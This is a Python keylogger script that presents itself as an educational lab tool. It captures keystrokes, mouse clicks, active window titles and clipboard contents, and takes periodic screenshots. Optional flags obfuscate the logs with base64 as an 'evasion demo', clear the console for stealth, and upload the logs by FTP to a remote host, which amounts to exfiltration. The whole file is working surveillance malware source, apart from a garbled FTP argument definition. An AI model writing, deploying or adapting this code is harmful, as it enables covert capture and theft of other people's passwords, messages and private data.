#!/usr/bin/env python3
"""
Ultimate educational keylogger: QoL features, context, optional stealth/exfil.
Visible PWD logs/screenshots only. CLI-driven for labs.

CLI examples:
  python keylogger.py --demo                 # Stdout only
  python keylogger.py --no-log --screenshots # Screenshots only
  python keylogger.py --ftp ... --obfuscate  # Exfil + evasion demo
  python keylogger.py --summary-only         # Reconstructed text only
"""

import argparse
import base64
import platform
from datetime import datetime
from pathlib import Path
import time
from threading import Timer
import os
import io

from pynput import keyboard, mouse  # pip install pynput
import pyautogui                 # pip install pyautogui
import pyperclip                 # pip install pyperclip (clipboard)

# ---------- CLI ----------
def parse_args():
    parser = argparse.ArgumentParser(description="Ultimate EH keylogger")
    parser.add_argument("--demo", action="store_true")
    parser.add_argument("--no-log", action="store_true")
    parser.add_argument("--summary-only", action="store_true", help="Log reconstructed phrases only")
    parser.add_argument("--screenshots", action="store_true", help="Take PNGs every 60s")
    parser.add_argument("--obfuscate", action="store_true", help="Base64-mangle logs (evasion demo)")
    parser.add_argument("--stealth", action="store_true", help="Minimize console window")
    parser.add_argument("--ftp-host", "--ftp-user", "--ftp-pass", "--ftp-dir")
    return parser.parse_args()

args = parse_args()
DEMO_MODE = args.demo
NO_LOG = args.no_log or DEMO_MODE or args.summary_only
SCREENSHOTS = args.screenshots
OBFUSCATE = args.obfuscate
STEALTH = args.stealth
FTP_ENABLED = bool(args.ftp_host)
FTP_CONFIG = {"host": args.ftp_host, "user": args.ftp_user, "pass": args.ftp_pass, "dir": args.ftp_dir or "/"} if FTP_ENABLED else None

# ---------- Config ----------
log_file = Path.cwd() / f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
screenshot_dir = Path.cwd() / "screenshots"
screenshot_dir.mkdir(exist_ok=True)
buffer = []
phrases = []  # For summaries
last_clipboard = ""
last_upload = 0
FTP_INTERVAL = 30
SCREENSHOT_INTERVAL = 60

# ---------- QoL Utils ----------
def get_window():
    return pyautogui.getActiveWindowTitle()[:60] or "UNKNOWN"

def format_key(key):
    try: return key.char
    except:
        m = {keyboard.Key.space:" ", keyboard.Key.enter:"[ENTER]\n", keyboard.Key.backspace:"[BS]",
             keyboard.Key.tab:"[TAB]", keyboard.Key.ctrl_l:"[CTRL]", keyboard.Key.shift:"[SHIFT]"}
        return m.get(key, f"[{str(key).upper()}]")

def obfuscate_text(text):
    if not OBFUSCATE: return text
    return base64.b64encode(text.encode()).decode()[:100] + "..."

def write_line(text):
    ts = datetime.now().strftime("%H:%M:%S")
    win = get_window()
    line = f"[{ts}] [{win}] {text}"
    line = obfuscate_text(line) if OBFUSCATE else line
    if DEMO_MODE or args.summary_only:
        print(line, end="")
    elif not NO_LOG:
        with log_file.open("a", encoding="utf-8") as f:
            f.write(line + "\n")

def write_buffer():
    global buffer, phrases
    if buffer:
        phrase = "".join(c for c in buffer if c not in ["[BS]","[TAB]","[ENTER]"]).strip()
        if phrase and len(phrase) > 3:
            phrases.append(phrase)
        write_line("".join(buffer))
        buffer = []

def take_screenshot():
    if SCREENSHOTS:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        img_path = screenshot_dir / f"screenshot_{ts}.png"
        pyautogui.screenshot().save(img_path)
        print(f"[+] Screenshot: {img_path}")

def check_clipboard():
    global last_clipboard
    try:
        clip = pyperclip.paste()
        if clip != last_clipboard and clip.strip():
            write_line(f"[CLIPBOARD] {clip[:200]}...")
            last_clipboard = clip
    except: pass

def ftp_upload():
    global last_upload
    if FTP_ENABLED and log_file.exists() and time.time() - last_upload > FTP_INTERVAL:
        try:
            import ftplib
            ftp = ftplib.FTP(FTP_CONFIG["host"])
            ftp.login(FTP_CONFIG["user"], FTP_CONFIG["pass"])
            ftp.cwd(FTP_CONFIG["dir"])
            with log_file.open("rb") as f:
                ftp.storbinary(f"STOR {log_file.name}", f)
            ftp.quit()
            print("[+] FTP OK")
            last_upload = time.time()
        except Exception as e:
            print(f"[-] FTP: {e}")

def summary_report():
    if phrases:
        summary = " | ".join(phrases[-5:])
        write_line(f"[SUMMARY] Recent: {summary}")
        phrases.clear()

# ---------- Event handlers ----------
def on_key_press(key):
    global buffer
    key_str = format_key(key)
    buffer.append(key_str)
    if len(buffer) >= 20 or "[ENTER]" in key_str:
        write_buffer()

def on_key_release(key):
    if key == keyboard.Key.esc:
        write_buffer()
        summary_report()
        ftp_upload()
        take_screenshot()
        return False

def on_click(x, y, button, pressed):
    if pressed:
        write_line(f"[MOUSE {button}] at ({x},{y}) in [{get_window()}]")

def on_clipboard():
    check_clipboard()

# ---------- Main ----------
def main():
    if STEALTH:
        os.system("clear")  # Linux/Mac; Windows: cls

    print(f"[+] Log: {log_file} | Screenshots: {SCREENSHOTS} | Obfuscate: {OBFUSCATE} | FTP: {FTP_ENABLED}")
    if NO_LOG and not SCREENSHOTS:
        print("[+] No persistent logs/screenshots")

    # Start periodic tasks
    if SCREENSHOTS: Timer(SCREENSHOT_INTERVAL, take_screenshot, ()).start()
    Timer(300, summary_report, ()).start()  # 5min summaries
    if FTP_ENABLED: Timer(FTP_INTERVAL, ftp_upload, ()).start()

    # Listeners
    kl = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
    ml = mouse.Listener(on_click=on_click)
    kl.start()
    ml.start()
    check_clipboard()  # Initial check

    kl.join()

if __name__ == "__main__":
    main()
